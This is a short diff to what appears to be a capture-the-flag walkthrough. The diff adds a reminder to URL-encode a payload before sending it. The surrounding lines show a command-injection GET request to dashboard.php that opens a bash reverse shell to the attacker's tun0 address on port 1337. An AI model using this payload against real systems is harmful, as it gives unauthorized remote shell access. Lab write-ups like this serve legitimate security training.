@@ -42,4 +42,5 @@ GET /dashboard.php?cmd=bash -c 'exec bash -i &>/dev/tcp/tun0-IP/1337 <&1'
 ```
 
 * Highlight the reverse shell payload and do CTRL+U to URL encode
+  * <mark style="color:yellow;">Since it is a GET request, you absolutely need to URL encode!</mark>
 * Send the request and see if you get a shell
